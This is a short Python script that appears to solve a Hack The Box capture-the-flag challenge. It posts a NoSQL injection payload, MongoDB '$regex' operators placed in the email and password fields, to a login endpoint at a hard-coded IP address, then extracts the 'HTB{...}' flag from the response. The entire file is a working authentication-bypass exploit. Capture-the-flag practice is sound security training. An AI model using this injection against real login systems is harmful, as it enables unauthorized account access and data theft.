import requests
import re
url = 'http://94.237.62.49:38802/'

res = requests.post(url+"login",json={"email":{"$regex":"^.*"},"password":{"$regex":"^.*"}},headers={"Content-Type":"application/json"})
print(re.findall(r'\bHTB{.*}',res.text)[0])
